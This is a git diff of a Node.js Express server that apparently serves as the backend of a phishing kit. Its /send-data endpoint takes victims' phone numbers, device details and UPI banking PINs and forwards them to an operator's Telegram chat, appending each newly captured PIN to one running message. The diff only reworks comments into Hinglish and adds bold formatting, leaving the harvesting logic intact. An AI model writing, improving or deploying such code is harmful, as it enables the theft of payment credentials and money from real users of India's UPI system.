@@ -9,14 +9,14 @@ app.use(express.json());
 
 const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
 
-// State to handle message editing
+// State management for editing the same message
 let lastMessageId = null;
 let currentMessageText = "";
 
 const sendOrUpdateTelegram = async (message) => {
     try {
         if (!lastMessageId) {
-            // Send new message for the first hit (Number)
+            // Naya message bhejta hai jab pehli baar data aata hai
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
                 text: message,
@@ -25,7 +25,7 @@ const sendOrUpdateTelegram = async (message) => {
             lastMessageId = response.data.result.message_id;
             currentMessageText = message;
         } else {
-            // Edit the existing message for UPI PINs
+            // Purane message ko hi edit karta hai naye PINs ke saath
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                 chat_id: CHAT_ID,
                 message_id: lastMessageId,
@@ -35,7 +35,7 @@ const sendOrUpdateTelegram = async (message) => {
             currentMessageText = message;
         }
     } catch (error) {
-        // Fallback: if edit fails, send a fresh one
+        // Agar edit fail ho (e.g. message delete ho gaya), toh naya message bhej do
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
@@ -47,7 +47,6 @@ const sendOrUpdateTelegram = async (message) => {
 };
 
 const startupNotification = async () => {
-    // Basic notification without setting lastMessageId
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
@@ -63,15 +62,15 @@ app.post('/send-data', async (req, res) => {
     let updatedText = "";
 
     if (type === 'NUMBER') {
-        // Fresh block for new user/number
+        // Naya session shuru: purani ID reset taaki naya block bane
         lastMessageId = null; 
-        updatedText = `Device Model: ${deviceId || 'Detecting...'}\n`;
-        updatedText += `Date: ${deviceDate || 'Detecting...'}\n`; 
-        updatedText += `Real Time: ${deviceTime || 'Detecting...'}\n`; 
-        updatedText += `Number: +91 ${number}\n`;
-    } else if (type === 'PIN' || pin) {
-        // Append new PIN under the existing number message
-        updatedText = currentMessageText + `UPI PIN: ${pin}\n`;
+        updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
+        updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
+        updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
+        updatedText += `*Number:* +91 ${number}\n`;
+    } else if (pin) {
+        // Purane text ke niche naya Bold UPI PIN add karega
+        updatedText = currentMessageText + `*UPI PIN:* ${pin}\n`;
     }
 
     if (updatedText) {
